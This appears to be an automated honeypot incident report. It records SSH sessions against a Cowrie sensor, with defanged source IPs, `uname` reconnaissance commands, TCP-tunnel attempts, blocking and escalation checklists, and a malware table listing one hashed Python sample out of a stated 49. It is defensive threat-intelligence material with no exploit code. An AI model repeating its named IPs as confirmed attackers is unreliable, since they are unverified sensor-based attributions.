| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:22 |
| **Last Seen** | 2026-07-16 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:22:51` | `cowrie.session.connect` |
| `2026-07-16 12:22:51` | `cowrie.client.version` |
| `2026-07-16 12:22:51` | `cowrie.client.kex` |
| `2026-07-16 12:22:51` | `cowrie.login.success` |
| `2026-07-16 12:22:52` | `cowrie.session.params` |
| `2026-07-16 12:22:52` | `cowrie.command.input` |
| `2026-07-16 12:22:52` | `cowrie.log.closed` |
| `2026-07-16 12:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b4eb141c6c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:24 |
| **Last Seen** | 2026-07-16 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:24:25` | `cowrie.session.connect` |
| `2026-07-16 12:24:25` | `cowrie.client.version` |
| `2026-07-16 12:24:25` | `cowrie.client.kex` |
| `2026-07-16 12:24:25` | `cowrie.login.success` |
| `2026-07-16 12:24:26` | `cowrie.session.params` |
| `2026-07-16 12:24:26` | `cowrie.command.input` |
| `2026-07-16 12:24:26` | `cowrie.log.closed` |
| `2026-07-16 12:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bbe3ec8ad87

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-16 12:25 |
| **Last Seen** | 2026-07-16 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:25:31` | `cowrie.session.connect` |
| `2026-07-16 12:25:31` | `cowrie.client.version` |
| `2026-07-16 12:25:31` | `cowrie.client.kex` |
| `2026-07-16 12:25:32` | `cowrie.login.success` |
| `2026-07-16 12:25:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-178ee3a904b1

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-16 12:25 |
| **Last Seen** | 2026-07-16 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:25:31` | `cowrie.session.connect` |
| `2026-07-16 12:25:31` | `cowrie.client.version` |
| `2026-07-16 12:25:31` | `cowrie.client.kex` |
| `2026-07-16 12:25:32` | `cowrie.login.success` |
| `2026-07-16 12:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ca25ed996a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:26 |
| **Last Seen** | 2026-07-16 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:26:03` | `cowrie.session.connect` |
| `2026-07-16 12:26:03` | `cowrie.client.version` |
| `2026-07-16 12:26:03` | `cowrie.client.kex` |
| `2026-07-16 12:26:04` | `cowrie.login.success` |
| `2026-07-16 12:26:04` | `cowrie.session.params` |
| `2026-07-16 12:26:04` | `cowrie.command.input` |
| `2026-07-16 12:26:05` | `cowrie.log.closed` |
| `2026-07-16 12:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05cb99416f12

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:27 |
| **Last Seen** | 2026-07-16 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:27:43` | `cowrie.session.connect` |
| `2026-07-16 12:27:43` | `cowrie.client.version` |
| `2026-07-16 12:27:43` | `cowrie.client.kex` |
| `2026-07-16 12:27:43` | `cowrie.login.success` |
| `2026-07-16 12:27:44` | `cowrie.session.params` |
| `2026-07-16 12:27:44` | `cowrie.command.input` |
| `2026-07-16 12:27:44` | `cowrie.log.closed` |
| `2026-07-16 12:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-050cd8b0dd94

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:29 |
| **Last Seen** | 2026-07-16 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:29:16` | `cowrie.session.connect` |
| `2026-07-16 12:29:16` | `cowrie.client.version` |
| `2026-07-16 12:29:17` | `cowrie.client.kex` |
| `2026-07-16 12:29:17` | `cowrie.login.success` |
| `2026-07-16 12:29:18` | `cowrie.session.params` |
| `2026-07-16 12:29:18` | `cowrie.command.input` |
| `2026-07-16 12:29:18` | `cowrie.log.closed` |
| `2026-07-16 12:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14995eb3db88

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 12:30 |
| **Last Seen** | 2026-07-16 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:30:55` | `cowrie.session.connect` |
| `2026-07-16 12:30:56` | `cowrie.client.version` |
| `2026-07-16 12:30:56` | `cowrie.client.kex` |
| `2026-07-16 12:30:56` | `cowrie.login.success` |
| `2026-07-16 12:30:57` | `cowrie.session.params` |
| `2026-07-16 12:30:57` | `cowrie.command.input` |
| `2026-07-16 12:30:57` | `cowrie.log.closed` |
| `2026-07-16 12:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ac0bedfc31c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:30 |
| **Last Seen** | 2026-07-16 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:30:57` | `cowrie.session.connect` |
| `2026-07-16 12:30:57` | `cowrie.client.version` |
| `2026-07-16 12:30:57` | `cowrie.client.kex` |
| `2026-07-16 12:30:58` | `cowrie.login.success` |
| `2026-07-16 12:30:58` | `cowrie.session.params` |
| `2026-07-16 12:30:58` | `cowrie.command.input` |
| `2026-07-16 12:30:59` | `cowrie.log.closed` |
| `2026-07-16 12:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aba6d7b8eae9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 12:31 |
| **Last Seen** | 2026-07-16 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:31:32` | `cowrie.session.connect` |
| `2026-07-16 12:31:32` | `cowrie.client.version` |
| `2026-07-16 12:31:32` | `cowrie.client.kex` |
| `2026-07-16 12:31:33` | `cowrie.login.success` |
| `2026-07-16 12:31:33` | `cowrie.direct-tcpip.request` |
| `2026-07-16 12:31:33` | `cowrie.direct-tcpip.data` |
| `2026-07-16 12:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a25a86bd77eb

| Field | Detail |
|---|---|
| **Source IP** | `178.216.165[.]187` |
| **First Seen** | 2026-07-16 12:31 |
| **Last Seen** | 2026-07-16 12:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:31:42` | `cowrie.session.connect` |
| `2026-07-16 12:31:42` | `cowrie.client.version` |
| `2026-07-16 12:31:42` | `cowrie.client.kex` |
| `2026-07-16 12:31:43` | `cowrie.login.success` |
| `2026-07-16 12:31:44` | `cowrie.direct-tcpip.request` |
| `2026-07-16 12:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.216.165[.]187` to AbuseIPDB if not already reported
- [ ] Block `178.216.165[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970a9166d357

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:32 |
| **Last Seen** | 2026-07-16 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:32:40` | `cowrie.session.connect` |
| `2026-07-16 12:32:40` | `cowrie.client.version` |
| `2026-07-16 12:32:40` | `cowrie.client.kex` |
| `2026-07-16 12:32:41` | `cowrie.login.success` |
| `2026-07-16 12:32:42` | `cowrie.session.params` |
| `2026-07-16 12:32:42` | `cowrie.command.input` |
| `2026-07-16 12:32:42` | `cowrie.log.closed` |
| `2026-07-16 12:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56037e704859

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:34 |
| **Last Seen** | 2026-07-16 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:34:21` | `cowrie.session.connect` |
| `2026-07-16 12:34:21` | `cowrie.client.version` |
| `2026-07-16 12:34:21` | `cowrie.client.kex` |
| `2026-07-16 12:34:21` | `cowrie.login.success` |
| `2026-07-16 12:34:22` | `cowrie.session.params` |
| `2026-07-16 12:34:22` | `cowrie.command.input` |
| `2026-07-16 12:34:22` | `cowrie.log.closed` |
| `2026-07-16 12:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f35a28c04ae

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:35 |
| **Last Seen** | 2026-07-16 12:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:35:56` | `cowrie.session.connect` |
| `2026-07-16 12:35:56` | `cowrie.client.version` |
| `2026-07-16 12:35:56` | `cowrie.client.kex` |
| `2026-07-16 12:35:56` | `cowrie.login.success` |
| `2026-07-16 12:35:57` | `cowrie.session.params` |
| `2026-07-16 12:35:57` | `cowrie.command.input` |
| `2026-07-16 12:35:57` | `cowrie.log.closed` |
| `2026-07-16 12:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61d548bcb847

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-07-16 12:36 |
| **Last Seen** | 2026-07-16 12:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:36:48` | `cowrie.session.connect` |
| `2026-07-16 12:36:48` | `cowrie.client.version` |
| `2026-07-16 12:36:48` | `cowrie.client.kex` |
| `2026-07-16 12:36:53` | `cowrie.login.success` |
| `2026-07-16 12:36:54` | `cowrie.direct-tcpip.request` |
| `2026-07-16 12:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e826d2a77759

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:37 |
| **Last Seen** | 2026-07-16 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:37:31` | `cowrie.session.connect` |
| `2026-07-16 12:37:31` | `cowrie.client.version` |
| `2026-07-16 12:37:31` | `cowrie.client.kex` |
| `2026-07-16 12:37:31` | `cowrie.login.success` |
| `2026-07-16 12:37:32` | `cowrie.session.params` |
| `2026-07-16 12:37:32` | `cowrie.command.input` |
| `2026-07-16 12:37:32` | `cowrie.log.closed` |
| `2026-07-16 12:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0104abeeba4f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:39 |
| **Last Seen** | 2026-07-16 12:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:39:11` | `cowrie.session.connect` |
| `2026-07-16 12:39:11` | `cowrie.client.version` |
| `2026-07-16 12:39:11` | `cowrie.client.kex` |
| `2026-07-16 12:39:11` | `cowrie.login.success` |
| `2026-07-16 12:39:12` | `cowrie.session.params` |
| `2026-07-16 12:39:12` | `cowrie.command.input` |
| `2026-07-16 12:39:12` | `cowrie.log.closed` |
| `2026-07-16 12:39:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd6f34935aef

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:40 |
| **Last Seen** | 2026-07-16 12:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:40:47` | `cowrie.session.connect` |
| `2026-07-16 12:40:47` | `cowrie.client.version` |
| `2026-07-16 12:40:47` | `cowrie.client.kex` |
| `2026-07-16 12:40:47` | `cowrie.login.success` |
| `2026-07-16 12:40:48` | `cowrie.session.params` |
| `2026-07-16 12:40:48` | `cowrie.command.input` |
| `2026-07-16 12:40:48` | `cowrie.log.closed` |
| `2026-07-16 12:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305073e4d3f2

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 12:44 |
| **Last Seen** | 2026-07-16 12:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:44:11` | `cowrie.session.connect` |
| `2026-07-16 12:44:11` | `cowrie.client.version` |
| `2026-07-16 12:44:11` | `cowrie.client.kex` |
| `2026-07-16 12:44:12` | `cowrie.login.success` |
| `2026-07-16 12:44:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5419f69ed7ed

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 12:49 |
| **Last Seen** | 2026-07-16 12:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:49:04` | `cowrie.session.connect` |
| `2026-07-16 12:49:04` | `cowrie.client.version` |
| `2026-07-16 12:49:04` | `cowrie.client.kex` |
| `2026-07-16 12:49:04` | `cowrie.login.success` |
| `2026-07-16 12:49:04` | `cowrie.direct-tcpip.request` |
| `2026-07-16 12:49:04` | `cowrie.direct-tcpip.data` |
| `2026-07-16 12:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `50.62.181[.]92` | **32** | 2026-07-16 08:59 | 2026-07-16 12:46 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-16 09:06 | 2026-07-16 12:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.73[.]100` | **7** | 2026-07-16 12:03 | 2026-07-16 12:53 | 3m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-07-16 09:04 | 2026-07-16 09:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-16 10:11 | 2026-07-16 10:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-16 11:18 | 2026-07-16 11:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-07-16 11:35 | 2026-07-16 11:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.33.80[.]243` | **3** | 2026-07-16 09:37 | 2026-07-16 09:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]190` | **3** | 2026-07-16 12:52 | 2026-07-16 12:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]196` | **3** | 2026-07-16 12:52 | 2026-07-16 12:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-16 09:59 | 2026-07-16 09:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-16 12:31 | 2026-07-16 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-07-16 08:55 | 2026-07-16 08:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.15[.]156` | **2** | 2026-07-16 09:39 | 2026-07-16 09:41 | 2m | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]180` | **2** | 2026-07-16 11:32 | 2026-07-16 11:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.254.214[.]117` | **2** | 2026-07-16 10:41 | 2026-07-16 10:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]16` | **2** | 2026-07-16 10:21 | 2026-07-16 10:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-07-16 12:41 | 2026-07-16 12:41 | 5s | 0 | `T1592` | 🟢 LOW |
| `111.47.65[.]219` | 1 | 2026-07-16 11:00 | 2026-07-16 11:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.150.92[.]172` | 1 | 2026-07-16 11:41 | 2026-07-16 11:42 | 17s | 0 | `T1592` | 🟢 LOW |
| `115.190.128[.]221` | 1 | 2026-07-16 11:40 | 2026-07-16 11:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.215.11[.]24` | 1 | 2026-07-16 10:07 | 2026-07-16 10:07 | 12s | 0 | `T1592` | 🟢 LOW |
| `117.34.210[.]196` | 1 | 2026-07-16 11:06 | 2026-07-16 11:06 | 7s | 0 | `T1592` | 🟢 LOW |
| `118.145.111[.]33` | 1 | 2026-07-16 11:36 | 2026-07-16 11:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.96[.]161` | 1 | 2026-07-16 12:44 | 2026-07-16 12:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.52.18[.]124` | 1 | 2026-07-16 11:04 | 2026-07-16 11:05 | 42s | 0 | `T1592` | 🟢 LOW |
| `154.126.168[.]212` | 1 | 2026-07-16 09:22 | 2026-07-16 09:22 | 15s | 0 | `T1592` | 🟢 LOW |
| `183.171.47[.]32` | 1 | 2026-07-16 11:56 | 2026-07-16 11:56 | 4s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]180` | 1 | 2026-07-16 09:09 | 2026-07-16 09:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.37.69[.]115` | 1 | 2026-07-16 10:05 | 2026-07-16 10:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.88.120[.]62` | 1 | 2026-07-16 11:24 | 2026-07-16 11:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-07-16 11:43 | 2026-07-16 11:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.66.197[.]199` | 1 | 2026-07-16 12:03 | 2026-07-16 12:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.99.212[.]58` | 1 | 2026-07-16 10:23 | 2026-07-16 10:23 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-07-16 10:33 | 2026-07-16 10:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | 1 | 2026-07-16 10:21 | 2026-07-16 10:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-07-16 12:33 | 2026-07-16 12:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-16 09:35 | 2026-07-16 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-07-16 09:30 | 2026-07-16 09:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `60.177.213[.]215` | 1 | 2026-07-16 09:37 | 2026-07-16 09:37 | 13s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-07-16 10:07 | 2026-07-16 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]100` | 1 | 2026-07-16 09:52 | 2026-07-16 09:52 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]163` | 1 | 2026-07-16 12:53 | 2026-07-16 12:53 | 16s | 0 | `T1592` | 🟢 LOW |
| `83.191.181[.]23` | 1 | 2026-07-16 11:21 | 2026-07-16 11:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]22` | 1 | 2026-07-16 10:35 | 2026-07-16 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]29` | 1 | 2026-07-16 10:37 | 2026-07-16 10:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.248.250[.]143` | 1 | 2026-07-16 11:53 | 2026-07-16 11:53 | 1s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-07-16 10:34 | 2026-07-16 10:36 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
